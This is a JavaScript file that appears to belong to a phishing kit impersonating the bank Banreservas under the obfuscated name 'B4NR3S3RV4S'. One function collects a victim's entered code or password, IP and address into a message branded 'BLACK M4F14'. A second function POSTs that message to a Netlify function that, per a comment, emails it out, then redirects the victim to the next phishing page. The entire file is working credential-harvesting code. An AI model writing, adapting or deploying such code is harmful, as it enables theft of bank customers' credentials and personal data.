var ready = function() {
    let u_name = document.getElementById("0T4RX").value;
    let ip     = document.getElementById("ip").innerHTML;
    let ip2    = document.getElementById("address").innerHTML;

    return `🔹B4NR3S3RV4S v.1🔹\n🔐C0DIX: ${u_name}\n\nIP: ${ip}\n${ip2}\n🔹BLACK M4F14🔹`;
};

var sender = function() {
    let message = ready();

    fetch('/.netlify/functions/sendEmail', {  // apunta a la función NodeMailer
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })       // <-- enviamos el mensaje completo
    })
    .then(r => r.json())
    .then(data => {
        console.log("Response:", data);
        window.location = 'index4.html';
    })
    .catch(err => console.error("Error:", err));

    return false;
};
